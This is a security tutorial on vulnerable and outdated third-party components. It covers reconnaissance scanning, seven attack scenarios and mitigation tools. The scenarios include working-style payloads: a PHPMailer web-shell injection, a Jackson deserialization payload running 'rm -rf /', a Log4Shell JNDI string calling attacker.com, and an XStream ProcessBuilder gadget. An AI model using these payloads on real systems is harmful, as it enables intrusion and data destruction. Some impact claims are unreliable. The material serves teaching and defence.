# Vulnerable and Outdated Components

Unless you are writing a really simple function which doesn’t do much, you will reuse software of other people. From development to deployment, you will use libraries, frameworks, technologies, etc. And guess what! Those third-party components will also depend on other components!\
This comes at a cost. In fact, part of the third-party software components you will reuse will suffer from security vulnerabilities. Besides, you might even be using some malicious components. Therefore, checking your code is a need, not a luxury.\
Let’s first understand how attackers find and exploit vulnerable components.

### How Attackers Find Vulnerable Components

#### Step 1: Port Scanning&#x20;

```bash
# Scan all ports and get service versions
nmap -sV -p- target.com

# Fast scanning with Masscan
masscan -p0-65535 target.com --rate=1000

# Efficient scanning with RustScan
rustscan -a target.com -- -sV
```

Open ports reveal:

* Apache/Nginx web servers
* MySQL/PostgreSQL databases
* Application frameworks
* Third-party services

***

#### Step 2: Fingerprint Technologies

**Check HTTP Response Headers:**

```bash
curl -I target.com

# Output reveals:
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319
```

**Automated Fingerprinting Tools:**

* **Wappalyzer** (browser extension) — Detects frontend and backend technologies
* **BuiltWith** (online tool) — Full breakdown of site's technology stack
* **Shodan** — Search for specific technologies and versions

**Example: Detecting Laravel**

Look at HTTP headers and HTML source for Laravel clues:

```bash
curl target.com | grep -i "laravel\|csrf"
# Finds CSRF token format specific to Laravel
```

**Check Dependency Files:**

If you gain source code access, check:

* `package.json` (JavaScript/Node.js)
* `composer.json` (PHP)
* `requirements.txt` (Python)
* `pom.xml` (Java)
* `Gemfile` (Ruby)

Example `package.json` with vulnerable dependencies:

```json
{
  "dependencies": {
    "lodash": "4.17.5",
    "express": "4.16.3",
    "phpmailer": "5.2.6"
  }
}
```

All three are vulnerable versions.

***

#### Step 3: Trigger Errors to Reveal Technology Details

Submit malformed input to expose error messages:

```bash
# Malformed URL
curl "target.com/index.php?id='"

# Returns PHP error with file paths:
# Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, 
# boolean given in /var/www/html/index.php on line 45

# Reveals: PHP backend, MySQL, file paths
```

***

#### Step 4: Forced Browsing — Discover Hidden Files

Find default files and admin panels:

```bash
# Directory enumeration
dirsearch -u target.com -e php,html,txt

# Brute force with Gobuster
gobuster dir -u target.com -w wordlist.txt

# Fuzzy finding with ffuf
ffuf -w wordlist.txt -u https://target.com/FUZZ
```

Common targets:

* `/admin`, `/admin-panel`, `/administrator`
* `/version`, `/status`, `/server-info`
* `/composer.json` (exposes PHP dependencies)
* `/.env` (environment variables and secrets)

***

#### Step 5: Identify CVEs and Find Exploits

Once you've identified technologies and versions, search for known vulnerabilities:

**CVE Databases:**

1. **Exploit-DB** (exploit-db.com) — Public exploits repository
2. **NVD** (nvd.nist.gov) — National Vulnerability Database
3. **MITRE CVE** (cve.mitre.org) — Official CVE records
4. **Snyk** (snyk.io) — Open-source vulnerability scanning
5. **GitHub Security Advisories** — Vulnerabilities in repositories

**Example: Finding Apache Struts RCE**

```bash
# Identify version: Apache Struts 2.3.16

# Search for exploits
site:exploit-db.com "Apache Struts 2.3.16"

# Find: CVE-2017-5638 - Remote Code Execution

# Check Metasploit:
msfconsole> search struts2_content_type_ognl
msfconsole> use exploit/multi/http/struts2_content_type_ognl
```

***

### Real-World Attack Scenarios

#### Scenario 1: Prototype Pollution in Lodash (CVE-2018-16487)

A Node.js application uses vulnerable `lodash` 4.17.5:

```json
{
  "dependencies": {
    "lodash": "4.17.5"
  }
}
```

**The Attack:**

Send a JSON payload with prototype pollution:

```bash
curl -X POST http://example.com/api/user \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test",
    "constructor": {
      "prototype": {
        "isAdmin": true
      }
    }
  }'
```

The vulnerable lodash modifies JavaScript's Object prototype. All objects now have `isAdmin: true`.

**Result:**

* Authentication bypass
* Authorization escalation
* Remote code execution

**Finding it:**

```bash
npm audit

# Output:
# lodash 4.17.5 - Prototype Pollution
# Severity: high
# CVE: CVE-2018-16487
```

***

#### Scenario 2: Unmaintained PHPMailer with RCE (CVE-2016-10033)

PHP application uses `PHPMailer` 5.2.6 (last update: 2015):

```php
<?php
require 'PHPMailer/PHPMailerAutoload.php';

$mail = new PHPMailer();
$mail->addAddress($_POST['email']);  // User input!
$mail->send();
?>
```

**The Attack:**

Send a malicious email parameter:

```bash
POST /sendmail.php HTTP/1.1

email=attacker@example.com -X/tmp/php.sh "<?php system($_GET['cmd']); ?>"
```

The unmaintained library doesn't sanitize the parameter. It's passed to shell commands unsafely.

**Result:**

* Remote code execution
* Server compromise
* 8+ years of vulnerability exposure (2015-2023)

**Why it's dangerous:**

* Unmaintained means NO security patches
* Developers don't know it's vulnerable
* No updates available even if they patch
* Vulnerability persists indefinitely

***

#### Scenario 3: Transitive Dependency Vulnerability (Jackson RCE)

Java application uses Spring Boot 1.5.0:

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <version>1.5.0</version>
</dependency>
```

Spring Boot depends on Jackson 2.8.0, which has CVE-2017-7525: RCE via deserialization.

**The Attack:**

Send malicious JSON:

```bash
curl -X POST http://example.com/api/user \
  -H "Content-Type: application/json" \
  -d '{
    "@type": "org.springframework.expression.spel.standard.SpelExpressionParser",
    "expression": "T(java.lang.Runtime).getRuntime().exec(\"rm -rf /\")"
  }'
```

Jackson deserializes the @type field, instantiating SpelExpressionParser, which executes arbitrary expressions.

**Result:**

* Remote code execution
* Complete server compromise
* Vulnerability hidden in transitive dependency

**Finding it:**

```bash
# See all dependencies including transitive
mvn dependency:tree

# Identify Jackson 2.8.0 in the tree
# Even if you don't directly depend on it

# Run vulnerability scan
mvn clean dependency-check:check
```

***

#### Scenario 4: Log4Shell (CVE-2021-44228)

Java application uses Apache Log4j 2.14.0:

```java
public void processUserInput(String userInput) {
    logger.info("Processing: " + userInput);  // Vulnerable!
}
```

**The Attack:**

Send a specially crafted string that triggers JNDI injection:

```bash
# Attacker sends this in any loggable field
${jndi:ldap://attacker.com/Exploit}

# When logged, Log4j interprets it as JNDI lookup
# Connects to attacker's LDAP server
# Downloads and executes malicious code
```

**Result:**

* Remote code execution
* Affects billions of devices worldwide
* One of the most critical vulnerabilities ever

**Real-world impact:**

* SolarWinds, Apple, Twitter, Cloudflare compromised
* Critical infrastructure vulnerable
* Estimated billions of devices affected

**Finding it:**

```bash
# Check Log4j version
grep -r "log4j-core" pom.xml

# If version < 2.16.0, vulnerable
# If version < 2.17.1, vulnerable to bypass

# Use Snyk to scan
snyk test
```

***

#### Scenario 5: Typosquatting Attack (python3-dateutil)

Attacker creates malicious package `python3-dateutil` (real package: `python-dateutil`):

**The Attack:**

1. Attacker publishes `python3-dateutil` to PyPI with malicious code
2. Developer typos the package name: `pip install python3-dateutil`
3. Instead of legitimate package, installs attacker's code
4. Malicious code exfiltrates SSH keys and credentials

**Result:**

* Backdoor in developer's environment
* Credentials stolen
* Projects compromised
* Supply chain attack

**Real incident:**

* Hundreds of developers downloaded the malicious package
* SSH keys exfiltrated to attacker server
* Complete compromise of developer accounts

**Finding it:**

```bash
# Always double-check package names
pip search python-dateutil

# Check package details
pip show python-dateutil

# Verify official source
# Should come from official maintainers only
```

***

#### Scenario 6: XStream Deserialization RCE

Java application uses XStream 1.4.5 for XML parsing:

```java
XStream xstream = new XStream();
Object obj = xstream.fromXML(userInput);  // Vulnerable!
```

**The Attack:**

Send malicious XML payload:

```xml
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class='java.beans.EventHandler'>
      <target class='java.lang.ProcessBuilder'>
        <command>
          <string>touch</string>
          <string>/tmp/pwned</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

XStream deserializes this as ProcessBuilder, executing arbitrary commands.

**Result:**

* Remote code execution
* File system access
* Complete server compromise

**Finding it:**

```bash
# Check pom.xml for XStream version
grep -A 2 "xstream" pom.xml

# If version < 1.4.8, vulnerable
# Multiple deserialization CVEs affect < 1.4.10
```

***

#### Scenario 7: Dependency Confusion Attack

Organization uses internal package `@company-utils` in private Maven repository. Attacker publishes `company-utils` version 2.0.0 to public Maven Central.

**The Attack:**

1. Build system configured to check public repos first
2. Attacker publishes `company-utils:2.0.0` to Maven Central with malicious code
3. Build system finds public version before private version
4. Malicious version downloaded and built into application
5. Application ships with attacker's backdoor

**Result:**

* Backdoor in production
* Supply chain compromise
* All customers affected

**Finding it:**

```bash
# Check dependency resolution order
mvn dependency:tree -Dverbose

# Audit which repositories are checked first
# Ensure private repos checked before public
```

***

### How to Identify Vulnerable Components During Testing

**1. List all dependencies and their versions:**

```bash
# Node.js
npm ls

# Python
pip freeze > requirements.txt

# PHP
composer show --all

# Java
mvn dependency:tree
```

**2. Scan for known vulnerabilities:**

```bash
# npm audit
npm audit

# Snyk (works with multiple languages)
snyk test

# OWASP Dependency-Check
dependency-check.sh --scan /path/to/application

# Safety (Python)
safety check
```

**3. Check for outdated/unmaintained packages:**

```bash
# npm
npm outdated

# Check last update date
npm info package-name

# If no updates in 2+ years, likely unmaintained
```

**4. Review dependency files:**

Look for ancient versions:

```json
{
  "lodash": "4.x",           // Yikes, 4.x is ancient!
  "moment": "2.29.x",        // Unmaintained as of 2020
  "jquery": "2.x"            // jQuery 2 EOL in 2016
}
```

**5. Check transitive dependencies:**

```bash
# See ALL dependencies, not just direct ones
npm ls --all

# Identify which package pulls in the vulnerable dependency
# Decide: Update parent package or exclude transitive dep
```

***

### Advanced Hunting Techniques

#### Use Nuclei for Automated Detection

Create a Nuclei template to detect outdated software:

```yaml
id: outdated-software-detection
info:
  name: Outdated Software Detection
  author: pentester
  severity: medium
  description: Detects outdated software versions

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/version"
      - "{{BaseURL}}/status"
      - "{{BaseURL}}/api/version"
      - "{{BaseURL}}/robots.txt"
    
    matchers:
      - type: regex
        part: header
        regex:
          - '(?i)(Server|X-Powered-By):.*?(Apache|nginx|PHP|WordPress)/(\d+\.\d+)'
    
    extractors:
      - type: regex
        regex:
          - '(?i)(Server|X-Powered-By):.*?([A-Za-z]+)/(\d+\.\d+\.\d+)'
```

**Run it:**

```bash
nuclei -t outdated-software-detection.yaml -u http://target.com
```

#### Automated Scanning with CI/CD

```bash
# In your CI/CD pipeline
npm audit --audit-level=moderate
snyk test --severity-threshold=high
dependency-check.sh --scan . --fail-on-cvss 7.0
```

***

### Mitigation Strategies

**1. Inventory all dependencies**

Know what you're using:

```bash
# Generate SBOM (Software Bill of Materials)
cyclonedx-npm --output-file sbom.json
```

**2. Update proactively**

```bash
# Check for outdated packages
npm outdated

# Update with caution
npm update

# Use tools to handle updates safely
npm audit fix
```

**3. Monitor for vulnerabilities continuously**

* **Snyk** — Continuous monitoring and automated PRs for fixes
* **Dependabot** — GitHub's dependency update automation
* **WhiteSource** — Enterprise scanning
* **Black Duck** — Comprehensive scanning

**4. Lock dependency versions**

```json
// Use package-lock.json (Node.js)
// Or composer.lock (PHP)
// Or Pipfile.lock (Python)
```

**5. Use only trusted sources**

* Verify package authenticity
* Use official package managers
* Check package integrity
* Review maintainer reputation

**6. Remove unused dependencies**

```bash
# Node.js - find unused
npm ls --depth=0

# Remove unused
npm prune
```

**7. Implement policies**

* No unmaintained packages
* Max age for packages without updates
* Mandatory security scanning
* Quarterly dependency audits
* Prevent transitive dependency exploits

**8. Patch vulnerable components immediately**

Especially for:

* RCE vulnerabilities
* Authentication bypass
* Data exposure
* Critical libraries (logging, JSON parsing, etc.)

***

{% embed url="<https://cwe.mitre.org/data/definitions/1035.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/1104.html>" %}

{% embed url="<https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/>" %}
